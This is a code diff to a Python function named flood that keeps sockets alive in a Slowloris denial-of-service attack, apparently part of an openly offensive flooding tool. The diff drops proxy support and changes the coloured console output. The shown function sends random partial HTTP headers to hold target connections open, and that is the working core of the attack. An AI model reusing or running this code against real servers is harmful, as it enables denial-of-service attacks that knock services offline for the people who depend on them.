@@ -2,12 +2,11 @@
 
 import random
 import socket
-from typing import Dict, Union
 
 from colorama import Fore
 
 
-def flood(sock: socket.SocketType, proxy: Union[Dict[str, str], None] = None) -> None:
+def flood(sock: socket.SocketType) -> None:
     """Keep alive the sockets in Slowloris flood.
 
     Args:
@@ -16,14 +15,10 @@ def flood(sock: socket.SocketType, proxy: Union[Dict[str, str], None] = None) ->
     Returns:
         None
     """
+    laddr, port = sock.getsockname()
     random_header = random.randint(1, 5000)
     sock.send(f"X-a: {random_header}".encode("utf-8"))
-    proxy_addr = (
-        f" | {Fore.CYAN}Proxy: {proxy['addr'] + ':' + proxy['port']:>21}"
-        if proxy
-        else ""
-    )
-    header_sent = f"{Fore.CYAN} Header Sent: X-a {random_header:>4}"
+    header_sent = f"{Fore.RESET} Header Sent:{Fore.BLUE} X-a {random_header:>4}"
     print(
-        f"{Fore.GREEN} --> Keeping Socket Alive... {Fore.RESET}|{header_sent}{Fore.RESET}{proxy_addr}{Fore.RESET}"
+        f"{Fore.RESET} --> Socket: {Fore.BLUE}{laddr}:{port} {Fore.RESET}|{header_sent} {Fore.RESET}"
     )
